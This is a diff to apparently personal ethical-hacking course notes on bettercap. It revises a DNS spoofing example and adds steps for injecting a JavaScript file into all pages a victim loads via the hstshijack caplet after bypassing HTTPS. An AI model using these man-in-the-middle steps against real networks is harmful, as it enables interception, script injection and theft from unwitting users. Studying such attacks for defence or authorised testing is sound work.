@@ -303,13 +303,22 @@ If a website is HSTS enabled, bypassing HTTPS will not work.
 ##### DNS spoofing
 Run `bettercap -iface wlan0 -caplet sniffing.cap` to start sniffing.
 
-Then run
+Then run the following.
 ```
 set dns.spoof.all true
-set dns.domains facebook.com,*.facebook.com
+set dns.domains example.com
 dns.spoof on
 ```
+##### Inject javascript code
+Say, javascript file location: /root/test.js
 
+Edit /usr/share/bettercap/caplets/hstshijack.cap. Add following.
+```
+set hstshijack.payloads *:/root/test.js
+```
+* to execute in all pages
+
+Then follow bypassing HTTPS procedure.
 
 
 Source: [Udemy: Learn ethical hacking from scratch by Zaid](https://www.udemy.com/course/learn-ethical-hacking-from-scratch/)
